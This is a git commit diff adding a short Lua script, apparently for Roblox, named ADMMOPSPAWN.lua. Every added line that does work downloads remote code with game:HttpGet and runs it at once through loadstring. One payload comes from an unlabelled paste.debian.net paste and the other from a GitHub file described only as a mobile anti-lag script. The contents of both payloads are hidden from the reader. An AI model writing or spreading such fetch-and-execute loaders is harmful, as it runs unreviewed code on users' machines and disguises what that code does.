e985781114e04baf0f91cc6120ad7d3bca1fecee
ShxDrag <bns19126@gmail.com>
2025-10-01 01:26:50 +0900

    Update ADMMOPSPAWN.lua

--- ADMMOPSPAWN.lua
+++ ADMMOPSPAWN.lua
@@ -1,1 +1,5 @@
-
+debuging = true
+loadstring(game:HttpGet("https://paste.debian.net/plainh/5fa82c3c/", true))()
+wait(1)
+-- For Mobile Anti Lag Script
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ShxDrag/Scripty/refs/heads/main/Spawn.lua"))()
